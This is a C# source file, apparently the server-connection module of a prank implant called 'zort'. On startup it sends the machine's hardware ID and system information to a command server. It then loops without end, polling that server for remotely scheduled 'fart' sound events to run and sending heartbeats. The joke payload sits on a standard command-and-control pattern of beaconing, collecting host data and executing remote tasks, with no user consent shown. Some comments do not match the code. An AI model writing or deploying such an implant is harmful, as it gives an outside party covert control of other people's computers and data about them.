using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace zort
{
    public class ServerCon : IPayloadModule
    {
        private const string SERVER_URL = "localhost:3000";
        private readonly Thread ServerThread = new Thread(ServerRoutine);

        public ElevationType ElevationType => ElevationType.Both;

        public string ModuleName => "ServerConnection";

        public void Start()
        {
            ServerThread.Start();
        }

        public void Stop()
        {
            if (ServerThread.IsAlive)
            {
                ServerThread.Abort();
            }
        }
        private static async void ServerRoutine()
        {
            List<Zort.FartSchedule> FartsAccountedFor = new List<Zort.FartSchedule>();
            //send data to /log endpoint on startup
            //fetch /heartbeat endpoint every 5 seconds

            string HWID = SysInfoHelper.HWID();
            SystemInfo info = SysInfoHelper.Get();

        sendSysData:
            var response = await SendRequestAsync("/log", new { hwid = HWID, sysdata = JsonConvert.SerializeObject(info) });
            if (response.IsSuccessStatusCode)
            {
                ModuleLogger.Log(typeof(ServerCon), "System info sent successfully.");
            }
            else
            {
                ModuleLogger.Log(typeof(ServerCon), "Failed to send system info. Retrying in 5 seconds...");
                await Task.Delay(5000);
                goto sendSysData;
            }

        getScheduledFarts:
            response = await SendRequestAsync("/getFarts", new { hwid = HWID });
            if (!response.IsSuccessStatusCode)
            {
                ModuleLogger.Log(typeof(ServerCon), "Failed to receive scheduled farts. Retrying in 5 seconds...");
                await Task.Delay(5000);
                goto getScheduledFarts;
            }

            try
            {

                var jsonResponse = await response.Content.ReadAsStringAsync();
                List<Zort.FartSchedule> scheduledFarts = new List<Zort.FartSchedule>();
                dynamic jObj = JsonConvert.DeserializeObject(jsonResponse);
                if (jObj == null || jObj.farts == null)
                {
                    ModuleLogger.Log(typeof(ServerCon), "No scheduled farts found.");
                    goto sendHeartbeat;
                }

                for (int i = 0; i < jObj.farts.Count; i++)
                {
                    var fartSchedule = new Zort.FartSchedule
                    {
                        Type = (Zort.FartType)Enum.Parse(typeof(Zort.FartType), ((string)jObj.farts[i].type), true),
                        Timestamp = DateTimeOffset.FromUnixTimeSeconds((long)jObj.farts[i].timestamp).UtcDateTime
                    };
                    scheduledFarts.Add(fartSchedule);
                }

                foreach (var fartSchedule in scheduledFarts)
                {
                    // Check if the fart is already scheduled
                    if (FartsAccountedFor.Exists(f => f.Timestamp == fartSchedule.Timestamp && f.Type == fartSchedule.Type)) continue;
                    else
                    {
                        Zort.ScheduledFart(fartSchedule);
                        FartsAccountedFor.Add(fartSchedule);
                    }
                }
            }
            catch (JsonException ex)
            {
                ModuleLogger.Log(typeof(ServerCon), $"Failed to parse scheduled farts: {ex.Message}");
            }

        sendHeartbeat:
            await SendRequestAsync("/heartbeat", new { hwid = HWID });
            await Task.Delay(1500);
            goto getScheduledFarts;
        }

        static async Task<HttpResponseMessage> SendRequestAsync(string endpoint, dynamic data)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Construct the URL with query parameters from the data object
                    var requestUrl = $"http://{SERVER_URL}{(endpoint.StartsWith("/") ? endpoint : "/" + endpoint)}?";
                    foreach (var property in data.GetType().GetProperties())
                    {
                        requestUrl += $"{property.Name}={property.GetValue(data)}&";
                    }
                    requestUrl = requestUrl.TrimEnd('&');

                    // Send the POST request
                    HttpResponseMessage response = await client.GetAsync(requestUrl);

                    return response;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                    return null;
                }
            }
        }
    }
}
